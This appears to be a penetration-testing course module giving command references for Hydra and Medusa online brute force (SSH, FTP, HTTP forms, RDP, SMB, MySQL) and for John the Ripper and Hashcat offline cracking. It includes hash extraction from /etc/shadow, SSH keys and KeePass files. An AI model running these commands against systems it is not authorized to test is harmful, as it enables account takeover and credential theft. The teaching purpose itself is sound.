# Password Attack Tools (Hydra, Medusa, John, Hashcat)

## Unit 4 - Topic 7 | Password Attacks

---

## Overview

This topic provides a comprehensive reference for the four essential password attack tools: **Hydra** and **Medusa** for online attacks, **John the Ripper** and **Hashcat** for offline hash cracking.

---

## 1. Hydra (Online Attacks)

```bash
# === THC-HYDRA — Most Popular Online Password Tool ===

# SYNTAX:
hydra -l USER -P PASSLIST TARGET PROTOCOL

# SSH:
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh -t 4

# FTP:
hydra -l admin -P passwords.txt target.com ftp

# HTTP GET (Basic Auth):
hydra -l admin -P passwords.txt target.com http-get /admin/

# HTTP POST Form:
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed" -V

# RDP:
hydra -l administrator -P passwords.txt rdp://target.com

# SMB:
hydra -l admin -P passwords.txt smb://target.com

# MySQL:
hydra -l root -P passwords.txt target.com mysql

# MULTIPLE USERS:
hydra -L users.txt -P passwords.txt target.com ssh

# === KEY FLAGS ===
# -l / -L    Single user / user list
# -p / -P    Single password / password list
# -t N       Parallel tasks (threads)
# -V         Verbose (show each attempt)
# -f         Stop after first valid password
# -s PORT    Non-standard port
# -o FILE    Output results to file
```

---

## 2. Medusa (Online Attacks)

```bash
# === MEDUSA — Parallel Online Password Testing ===

# SYNTAX:
medusa -h HOST -u USER -P PASSLIST -M MODULE

# SSH:
medusa -h target.com -u admin -P wordlist.txt -M ssh

# FTP:
medusa -h target.com -u admin -P wordlist.txt -M ftp

# HTTP:
medusa -h target.com -u admin -P wordlist.txt -M http -m DIR:/admin

# MySQL:
medusa -h target.com -u root -P wordlist.txt -M mysql

# Multiple hosts:
medusa -H hosts.txt -u admin -P wordlist.txt -M ssh

# === KEY FLAGS ===
# -h / -H    Single host / host list
# -u / -U    Single user / user list
# -p / -P    Single password / password list
# -M         Module (service type)
# -t N       Parallel connections
# -f         Stop after first success
# -n PORT    Non-standard port
# -O FILE    Output to file
```

---

## 3. John the Ripper (Offline Cracking)

```bash
# === JOHN THE RIPPER — Versatile Hash Cracker ===

# Auto-detect and crack:
john hashes.txt

# Specific format:
john --format=raw-md5 hashes.txt
john --format=NT hashes.txt
john --format=sha512crypt hashes.txt

# Wordlist mode:
john --wordlist=rockyou.txt hashes.txt

# Wordlist + rules:
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Incremental (brute force):
john --incremental hashes.txt

# Show cracked:
john --show hashes.txt

# List supported formats:
john --list=formats

# === HASH EXTRACTION ===
unshadow /etc/passwd /etc/shadow > combined.txt
zip2john file.zip > zip_hash.txt
rar2john file.rar > rar_hash.txt
pdf2john file.pdf > pdf_hash.txt
ssh2john id_rsa > ssh_hash.txt
keepass2john database.kdbx > keepass_hash.txt

# === KEY FLAGS ===
# --wordlist=FILE     Use wordlist
# --rules=RULES       Apply transformation rules
# --format=FORMAT     Specify hash format
# --show              Display cracked passwords
# --incremental       Brute force mode
# --fork=N            Use N CPU cores
```

---

## 4. Hashcat (GPU Offline Cracking)

```bash
# === HASHCAT — GPU-Accelerated Hash Cracker ===

# SYNTAX:
hashcat -m MODE -a ATTACK HASH_FILE [WORDLIST]

# ATTACK MODES:
# -a 0: Dictionary (straight)
# -a 1: Combination
# -a 3: Brute force (mask)
# -a 6: Hybrid wordlist + mask
# -a 7: Hybrid mask + wordlist

# COMMON MODES:
# -m 0:     MD5
# -m 100:   SHA-1
# -m 1000:  NTLM
# -m 1400:  SHA-256
# -m 1800:  SHA-512crypt (Linux)
# -m 3200:  bcrypt
# -m 5600:  NetNTLMv2
# -m 13100: Kerberos TGS (Kerberoast)
# -m 18200: Kerberos AS-REP (ASREProast)

# EXAMPLES:
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt
hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d?s
hashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d?d

# === KEY FLAGS ===
# -m MODE       Hash type
# -a ATTACK     Attack mode
# -r RULES      Rule file
# -o FILE       Output cracked
# --show        Display already cracked
# -w 3          Workload (1-4, higher=faster)
# --force       Override warnings
# --username    Hash file has usernames
# -b            Benchmark mode
```

---

## 5. Tool Comparison

| Feature | Hydra | Medusa | John | Hashcat |
|---------|:-----:|:------:|:----:|:-------:|
| **Type** | Online | Online | Offline | Offline |
| **Speed** | Network limited | Network limited | CPU | GPU (fastest) |
| **Protocols** | 50+ | 25+ | N/A | N/A |
| **Hash types** | N/A | N/A | 200+ | 300+ |
| **Rules** | N/A | N/A | ✅ | ✅ |
| **GPU support** | N/A | N/A | Limited | ✅ Full |
| **Best for** | Service brute | Multi-host | Versatile | Speed |

---

## Summary Table

| Tool | Type | Best For |
|------|------|---------|
| **Hydra** | Online | Single-target service brute force |
| **Medusa** | Online | Multi-host parallel testing |
| **John** | Offline | Versatile hash cracking, file hashes |
| **Hashcat** | Offline | GPU-accelerated, fastest cracker |

---

## Quick Revision Questions

1. **When do you use Hydra vs Hashcat?**
2. **What is the Hydra syntax for SSH brute force?**
3. **How does John auto-detect hash types?**
4. **What Hashcat attack mode is mask/brute force?**
5. **How do you extract hashes from encrypted files for John?**

---

[← Previous: Hash Cracking Basics](06-hash-cracking-basics.md)

---

*Unit 4 - Topic 7 of 7 | [Back to README](../README.md) | [Next Unit: Man-in-the-Middle Attacks →](../05-Man-in-the-Middle-Attacks/01-arp-spoofing-poisoning.md)*
